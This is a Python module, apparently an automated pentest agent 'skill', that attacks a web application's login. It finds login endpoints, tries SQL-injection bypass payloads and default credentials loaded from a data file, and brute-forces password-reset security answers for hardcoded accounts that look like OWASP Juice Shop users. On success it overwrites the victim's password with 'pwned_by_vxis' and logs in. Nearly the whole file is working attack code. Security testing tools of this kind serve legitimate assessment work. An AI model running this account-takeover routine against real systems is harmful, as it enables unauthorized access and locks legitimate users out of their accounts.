"""Skill: attempt_auth — try to authenticate via multiple methods."""

from __future__ import annotations
import logging
import re
from typing import Any
from ._payload_loader import load_skill_dataset as _load_ds

logger = logging.getLogger(__name__)

# Default credentials to try
DEFAULT_CREDS = [
    tuple(_c) for _c in _load_ds("attempt_auth", "default_creds")
]  # ADR-007 Phase 3-9 — data in data/payloads/attempt_auth.json

# SQLi bypass payloads
SQLI_CREDS = [
    tuple(_c) for _c in _load_ds("attempt_auth", "sqli_creds")
]  # ADR-007 Phase 3-9 — data in data/payloads/attempt_auth.json

# Common login endpoint patterns
LOGIN_PATHS = _load_ds(
    "attempt_auth", "login_paths"
)  # ADR-007 Phase 3-9 — data in data/payloads/attempt_auth.json

# Common password reset patterns
RESET_PATHS = _load_ds(
    "attempt_auth", "reset_paths"
)  # ADR-007 Phase 3-9 — data in data/payloads/attempt_auth.json


def _preview_text(text: str, limit: int = 240) -> str:
    return " ".join(str(text or "").split())[:limit]


def _extract_token_and_user_info(data: dict[str, Any]) -> tuple[str, dict[str, str]]:
    token = ""
    for key_path in [("authentication", "token"), ("token",), ("access_token",), ("data", "token")]:
        d: object = data
        for k in key_path:
            d = d.get(k, {}) if isinstance(d, dict) else {}
        if isinstance(d, str) and len(d) > 20:
            token = d
            break
    auth = data.get("authentication", data) if isinstance(data, dict) else {}
    user_info = {
        "email": auth.get("umail", auth.get("email", "")) if isinstance(auth, dict) else "",
        "role": auth.get("role", "") if isinstance(auth, dict) else "",
        "id": auth.get("bid", auth.get("id", "")) if isinstance(auth, dict) else "",
    }
    return token, user_info


def _identity_name(raw: dict[str, Any], index: int) -> str:
    for key in ("name", "identity", "email", "role", "id"):
        value = str(raw.get(key) or "").strip()
        if value:
            clean = re.sub(r"[^A-Za-z0-9_.:@-]+", "-", value).strip("-")
            if clean:
                return clean[:80]
    return f"identity-{index + 1}"


def _credential_specs(raw: Any) -> list[dict[str, str]]:
    """Normalize operator-supplied credential lists without changing defaults."""
    specs: list[dict[str, str]] = []
    if isinstance(raw, dict):
        iterable = []
        for name, value in raw.items():
            item = dict(value or {}) if isinstance(value, dict) else {}
            item.setdefault("name", str(name))
            iterable.append(item)
    elif isinstance(raw, (list, tuple)):
        iterable = list(raw)
    else:
        iterable = []

    for index, item in enumerate(iterable):
        if isinstance(item, dict):
            email = str(item.get("email") or item.get("username") or item.get("user") or "").strip()
            password = str(item.get("password") or item.get("pass") or item.get("pwd") or "").strip()
            if not email or not password:
                continue
            specs.append(
                {
                    "email": email,
                    "password": password,
                    "name": str(item.get("name") or item.get("identity") or ""),
                    "role": str(item.get("role") or ""),
                    "source": str(item.get("source") or "operator_credentials"),
                }
            )
        elif isinstance(item, (list, tuple)) and len(item) >= 2:
            specs.append(
                {
                    "email": str(item[0]),
                    "password": str(item[1]),
                    "name": "",
                    "role": "",
                    "source": f"operator_credentials[{index}]",
                }
            )
    return specs


def _principal_from_success(success: dict[str, Any], index: int) -> dict[str, Any]:
    user_info = dict(success.get("user_info") or {})
    creds = dict(success.get("credentials_used") or {})
    raw = {
        "name": success.get("identity") or user_info.get("email") or creds.get("email"),
        "email": user_info.get("email") or creds.get("email"),
        "role": user_info.get("role") or success.get("role") or "",
        "id": user_info.get("id") or "",
    }
    principal: dict[str, Any] = {
        "name": _identity_name(raw, index),
        "token": str(success.get("token") or ""),
        "role": str(raw.get("role") or ""),
        "email": str(raw.get("email") or ""),
        "source": str(success.get("method") or ""),
    }
    subject_id = str(raw.get("id") or "").strip()
    if subject_id:
        principal["id"] = subject_id
        principal["owned_ids"] = [subject_id]
    return principal


def _dedupe_identities(successes: list[dict[str, Any]]) -> list[dict[str, Any]]:
    identities: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()
    for success in successes:
        principal = _principal_from_success(success, len(identities))
        key = (principal.get("name", ""), principal.get("token", ""))
        if not key[0] and not key[1]:
            continue
        if key in seen:
            continue
        seen.add(key)
        identities.append(principal)
    return identities


def _owner_map_from_identities(identities: list[dict[str, Any]]) -> dict[str, str]:
    owners: dict[str, str] = {}
    for identity in identities:
        name = str(identity.get("name") or "")
        if not name:
            continue
        for obj_id in identity.get("owned_ids") or []:
            owners.setdefault(str(obj_id), name)
    return owners


def _format_login_transcript(
    endpoint: str,
    creds: dict[str, str],
    status: int,
    preview: str,
    *,
    label: str,
) -> str:
    body = f'{{"email":"{creds.get("email", "")}","password":"{creds.get("password", "")}"}}'
    return (
        f"[{label}]\n"
        f"POST {endpoint} HTTP/1.1\n"
        "Content-Type: application/json\n\n"
        f"{body}\n\n"
        f"HTTP/1.1 {status}\n\n"
        f"{preview}"
    )


async def execute(target_url: str, **kwargs: Any) -> dict[str, Any]:
    """Try multiple authentication methods against the target.

    Returns:
        {
            "authenticated": bool,
            "method": str,  # "default_creds", "sqli_bypass", "password_reset"
            "token": str,
            "user_info": dict,
            "login_endpoint": str,
            "credentials_used": dict,
            "all_attempts": [{"endpoint": ..., "creds": ..., "status": int}, ...],
            "control_checks": {...},
            "poc_http_exchange": str,
        }
    """
    from vxis.interaction.hands import SessionManager

    target = target_url.rstrip("/")
    all_attempts: list[dict[str, Any]] = []
    result = {
        "authenticated": False,
        "method": "",
        "token": "",
        "user_info": {},
        "login_endpoint": "",
        "credentials_used": {},
        "identities": [],
        "primary_identity": "",
        "owner_map": {},
        "all_attempts": all_attempts,
        "control_checks": {},
        "poc_http_exchange": "",
    }

    _mgr = SessionManager()
    _session = await _mgr.get_session(target)
    successful_logins: list[dict[str, Any]] = []

    # Phase 1: Find login endpoint
    active_login = ""
    for path in LOGIN_PATHS:
        try:
            r = await _session.request("POST", path, json_data={"email": "x", "password": "x"})
            if r.status != 404:
                active_login = path
                logger.info("Found login endpoint: %s (status %d)", path, r.status)
                break
        except Exception:
            continue

    if not active_login:
        # Try GET-based login forms
        for path in ["/login", "/signin", "/#/login"]:
            try:
                r = await _session.request("GET", path)
                if r.status == 200 and ("password" in r.text.lower() or "login" in r.text.lower()):
                    active_login = path.replace("/#/", "/rest/user/")  # guess REST endpoint
                    break
            except Exception:
                continue

    if not active_login:
        return {**result, "error": "No login endpoint found"}

    async def _record_login_attempt(
        email: str,
        pwd: str,
        *,
        phase: str,
        identity_hint: str = "",
    ) -> dict[str, Any] | None:
        try:
            identity = identity_hint or _identity_name({"email": email}, len(all_attempts))
            session = (
                _session
                if phase == "negative_control"
                else await _mgr.get_session(target, identity=f"{phase}:{identity}")
            )
            r = await session.request(
                "POST", active_login, json_data={"email": email, "password": pwd}
            )
        except Exception:
            return None
        preview = _preview_text(r.text)
        attempt = {
            "phase": phase,
            "endpoint": active_login,
            "creds": f"{email}:{pwd}",
            "status": r.status,
            "body_length": r.body_length,
            "response_preview": preview,
            "token_observed": False,
        }
        try:
            data = r.response.json()
        except Exception:
            data = {}
        token, user_info = _extract_token_and_user_info(data if isinstance(data, dict) else {})
        attempt["token_observed"] = bool(token)
        if user_info:
            attempt["user_info"] = user_info
        all_attempts.append(attempt)
        return {"response": r, "attempt": attempt, "token": token, "user_info": user_info}

    def _success_result(
        *,
        method: str,
        email: str,
        password: str = "",
        token: str,
        user_info: dict[str, Any],
        positive_attempt: dict[str, Any],
        label: str,
        extra_credentials: dict[str, str] | None = None,
    ) -> dict[str, Any]:
        control_checks = {
            "negative_control": baseline_control["attempt"] if baseline_control else {},
            "positive_control": positive_attempt,
        }
        credentials_used = dict(extra_credentials or {"email": email, "password": password})
        poc_http_exchange = "\n\n".join(
            filter(
                None,
                [
                    _format_login_transcript(
                        active_login,
                        {
                            "email": "vxis-negative-control@example.invalid",
                            "password": "definitely-wrong-password",
                        },
                        baseline_control["attempt"]["status"],
                        baseline_control["attempt"].get("response_preview", ""),
                        label="negative_control",
                    )
                    if baseline_control
                    else "",
                    _format_login_transcript(
                        active_login,
                        {"email": email, "password": password},
                        positive_attempt["status"],
                        positive_attempt.get("response_preview", ""),
                        label=label,
                    ),
                ],
            )
        )
        return {
            "authenticated": True,
            "method": method,
            "token": token,
            "user_info": user_info,
            "login_endpoint": active_login,
            "credentials_used": credentials_used,
            "control_checks": control_checks,
            "poc_http_exchange": poc_http_exchange,
        }

    def _finalize_successes() -> dict[str, Any]:
        if not successful_logins:
            return {}
        primary = successful_logins[0]
        identities = _dedupe_identities(successful_logins)
        return {
            **result,
            **primary,
            "all_attempts": all_attempts,
            "identities": identities,
            "primary_identity": identities[0]["name"] if identities else "",
            "owner_map": _owner_map_from_identities(identities),
            "successful_attempts": [
                {
                    "method": item.get("method", ""),
                    "identity": _principal_from_success(item, idx).get("name", ""),
                    "login_endpoint": item.get("login_endpoint", ""),
                    "status": (item.get("control_checks", {}) or {})
                    .get("positive_control", {})
                    .get("status"),
                }
                for idx, item in enumerate(successful_logins)
            ],
        }

    baseline_control = await _record_login_attempt(
        "vxis-negative-control@example.invalid",
        "definitely-wrong-password",
        phase="negative_control",
    )

    # Phase 2: Try SQLi bypass first (highest value)
    for email, pwd in SQLI_CREDS:
        outcome = await _record_login_attempt(email, pwd, phase="sqli_bypass")
        if not outcome:
            continue
        if outcome["response"].status == 200 and outcome["token"]:
            logger.info("SQLi auth bypass SUCCESS: %s", email)
            successful_logins.append(
                _success_result(
                    method="sqli_bypass",
                    email=email,
                    password=pwd,
                    token=outcome["token"],
                    user_info=outcome["user_info"],
                    positive_attempt=outcome["attempt"],
                    label="positive_bypass",
                )
            )

    # Phase 3: Try default credentials
    operator_creds = _credential_specs(
        kwargs.get("credentials")
        or kwargs.get("credential_set")
        or kwargs.get("identity_credentials")
        or kwargs.get("users")
    )
    default_specs = [
        {"email": email, "password": pwd, "name": "", "role": "", "source": "default_creds"}
        for email, pwd in DEFAULT_CREDS
    ]
    for spec in [*operator_creds, *default_specs]:
        email = spec["email"]
        pwd = spec["password"]
        phase = spec.get("source") or "default_creds"
        outcome = await _record_login_attempt(
            email,
            pwd,
            phase=phase,
            identity_hint=spec.get("name", ""),
        )
        if not outcome:
            continue
        if outcome["response"].status == 200 and outcome["token"]:
            logger.info("Default creds SUCCESS: %s:%s", email, pwd)
            success = _success_result(
                method="default_creds" if not operator_creds else phase,
                email=email,
                password=pwd,
                token=outcome["token"],
                user_info={
                    **outcome["user_info"],
                    "role": outcome["user_info"].get("role") or spec.get("role", ""),
                },
                positive_attempt=outcome["attempt"],
                label="positive_default_creds",
            )
            if spec.get("name"):
                success["identity"] = spec["name"]
            if spec.get("role"):
                success["role"] = spec["role"]
            successful_logins.append(success)

    if successful_logins:
        return _finalize_successes()

    # Phase 4: Try password reset with common security answers
    for reset_path in RESET_PATHS:
        try:
            # First check if endpoint exists
            r = await _session.request(
                "POST",
                reset_path,
                json_data={"email": "test", "answer": "x", "new": "x", "repeat": "x"},
            )
            if r.status == 404:
                continue

            # Try common email+answer combos
            common_resets = [
                ("admin@juice-sh.op", ["Samuel", "admin", "Admin"]),
                ("jim@juice-sh.op", ["Samuel", "Kirk", "Enterprise"]),
                ("admin", ["admin", "password", "root"]),
            ]
            for email, answers in common_resets:
                for ans in answers:
                    r = await _session.request(
                        "POST",
                        reset_path,
                        json_data={
                            "email": email,
                            "answer": ans,
                            "new": "pwned_by_vxis",
                            "repeat": "pwned_by_vxis",
                        },
                    )
                    if r.status == 200:
                        # Try logging in with new password
                        r2 = await _session.request(
                            "POST",
                            active_login,
                            json_data={"email": email, "password": "pwned_by_vxis"},
                        )
                        if r2.status == 200:
                            data = r2.response.json()
                            token = ""
                            for key_path in [("authentication", "token"), ("token",)]:
                                d = data
                                for k in key_path:
                                    d = d.get(k, {}) if isinstance(d, dict) else {}
                                if isinstance(d, str) and len(d) > 20:
                                    token = d
                                    break
                            if token:
                                logger.info("Password reset SUCCESS: %s answer=%s", email, ans)
                                reset_preview = _preview_text(r.text)
                                login_preview = _preview_text(r2.text)
                                control_checks = {
                                    "negative_control": baseline_control["attempt"]
                                    if baseline_control
                                    else {},
                                    "positive_control": {
                                        "phase": "password_reset",
                                        "endpoint": active_login,
                                        "creds": f"{email}:pwned_by_vxis",
                                        "status": r2.status,
                                        "body_length": r2.body_length,
                                        "response_preview": login_preview,
                                        "token_observed": True,
                                    },
                                    "reset_step": {
                                        "endpoint": reset_path,
                                        "status": r.status,
                                        "response_preview": reset_preview,
                                    },
                                }
                                return {
                                    **result,
                                    "authenticated": True,
                                    "method": "password_reset",
                                    "token": token,
                                    "identities": _dedupe_identities(
                                        [
                                            {
                                                "method": "password_reset",
                                                "token": token,
                                                "user_info": _extract_token_and_user_info(
                                                    data if isinstance(data, dict) else {}
                                                )[1],
                                                "credentials_used": {"email": email},
                                            }
                                        ]
                                    ),
                                    "login_endpoint": active_login,
                                    "credentials_used": {"email": email, "security_answer": ans},
                                    "reset_endpoint": reset_path,
                                    "all_attempts": all_attempts,
                                    "control_checks": control_checks,
                                    "poc_http_exchange": "\n\n".join(
                                        filter(
                                            None,
                                            [
                                                _format_login_transcript(
                                                    active_login,
                                                    {
                                                        "email": "vxis-negative-control@example.invalid",
                                                        "password": "definitely-wrong-password",
                                                    },
                                                    baseline_control["attempt"]["status"],
                                                    baseline_control["attempt"].get(
                                                        "response_preview", ""
                                                    ),
                                                    label="negative_control",
                                                )
                                                if baseline_control
                                                else "",
                                                (
                                                    f"[password_reset]\n"
                                                    f"POST {reset_path} HTTP/1.1\n"
                                                    "Content-Type: application/json\n\n"
                                                    f'{{"email":"{email}","answer":"{ans}","new":"pwned_by_vxis","repeat":"pwned_by_vxis"}}\n\n'
                                                    f"HTTP/1.1 {r.status}\n\n"
                                                    f"{reset_preview}"
                                                ),
                                                _format_login_transcript(
                                                    active_login,
                                                    {"email": email, "password": "pwned_by_vxis"},
                                                    r2.status,
                                                    login_preview,
                                                    label="positive_login_after_reset",
                                                ),
                                            ],
                                        )
                                    ),
                                }
        except Exception:
            continue

    return {
        **result,
        "all_attempts": all_attempts,
        "control_checks": {
            "negative_control": baseline_control["attempt"] if baseline_control else {},
        },
    }
